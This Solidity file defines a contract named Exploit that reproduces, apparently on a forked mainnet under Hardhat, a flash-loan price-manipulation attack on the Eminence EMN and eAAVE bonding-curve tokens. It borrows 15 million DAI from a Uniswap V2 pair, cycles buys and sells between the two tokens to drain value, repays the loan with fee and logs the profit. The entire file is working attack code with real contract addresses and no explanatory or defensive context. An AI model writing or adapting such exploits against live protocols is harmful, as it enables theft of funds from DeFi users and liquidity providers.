//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2ERC20.sol";
import "./IEminenceCurrency.sol";
import "./IEAAve.sol";

contract Exploit {
  IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
  IUniswapV2ERC20 dai = IUniswapV2ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
  IEminenceCurrency eminence = IEminenceCurrency(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
  IEAAve eAAVE = IEAAve(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);
  uint borrowed = 15000000000000000000000000;

  function run() public {
    pair.swap(borrowed, 0, address(this), "0x");
  }

  function uniswapV2Call(address,uint,uint,bytes calldata) external {
    dai.approve(address(eminence), borrowed);
    eminence.buy(borrowed, 0);

    uint balance = eminence.balanceOf(address(this));
    uint half = balance / 2;

    eminence.approve(address(eAAVE), half);
    eAAVE.buy(half, 0);

    eminence.sell(half, 0);

    uint remainderAAve = eAAVE.balanceOf(address(this));
    eAAVE.sell(remainderAAve, 0);

    uint awardedEMN = eminence.balanceOf(address(this));
    eminence.sell(awardedEMN, 0);

    uint toReturn = (borrowed * 1004) / 1000;
    dai.transfer(msg.sender, toReturn);

    console.log(dai.balanceOf(address(this)) / 1 ether);
  }
}
